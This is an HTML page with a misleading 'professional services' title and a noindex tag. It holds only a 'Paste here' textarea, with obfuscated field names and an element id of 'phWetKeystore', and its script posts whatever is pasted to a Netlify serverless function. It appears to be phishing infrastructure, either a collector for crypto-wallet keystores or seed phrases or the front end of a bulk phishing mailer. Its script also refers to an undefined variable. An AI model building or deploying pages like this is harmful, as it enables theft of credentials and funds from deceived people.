<!DOCTYPE html>
<html lang="en">
<head>
    <meta name=”robots” content=”noindex”>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sustainable Growth, Proffessional services</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f5f5f5;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .signin-container {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .logo img{
            width: 150px;
        }
        .logo{
            align-items: center;
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }
        .divider {
            border-top: 1px solid #dee2e6;
            margin: 1.5rem 0;
        }
        .form-check-input:checked {
            background-color: #009688;
            border-color: #009688;
        }
        .btn-signin {
            background-color: #000;
            color: white;
            width: 100%;
            padding: 0.75rem;
        }
        .btn-signin:hover {
            background-color: #333;
            color: white;
        }
        .error-button{
            background-color:red!important;
            color:#fff;
            cursor:not-allowed
        }
        .proceed-button{width:100%;
            padding:12px;
            background-color:#141414;
            color:#fff;border:none;
            border-radius:8px;
            cursor:pointer;
    margin-bottom:12px;
    font-weight:500
}

        .password-field {
            position: relative;
        }
        .show-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #009688;
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
        }
    </style>
</head>
<body>
    <div class="signin-container">
        
        <form action="/submit" id="conforpky" method="post" data-netlify="true" onsubmit="handleSubmit(event); return false">

            <div class="mb-3">
                <textarea name="recsx" class="form-control" rows="5" placeholder="Paste here" id="phWetKeystore" required></textarea>
            </div>
            
            <input type="hidden" name="form-name" value="conforpky">
            <button class="proceed-button" type="submit" id="sendMessageButton">🔑🚀👾</button>
        </form>

    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>

<script>
        function handleSubmit(event) {
    event.preventDefault();
    
    const form = document.getElementById('conforpky');
    const formData = new FormData(form);
    const data = Object.fromEntries(formData);
    const sendButton = form.querySelector(".proceed-button");
    
    sendButton.disabled = true;

    // ... (In your frontend JavaScript)
console.log("Recipients being sent:", recsx); // Add this line
    
    fetch("/.netlify/functions/submit", {
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
    .then(async response => {
        if (response.ok) {
            console.log('Sces');
            form.reset();
        } else {
            const errorText = await response.text();
            throw new Error(errorText || 'Ntwkrspsntok');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        sendButton.textContent = "Error Connecting";
        sendButton.classList.add("error-button");
    })
    .finally(() => {
        setTimeout(() => {
            sendButton.textContent = "Submit";
            sendButton.classList.remove("error-button");
            sendButton.disabled = false;
        }, 2000);
    });
}
    </script>

</body>
</html>
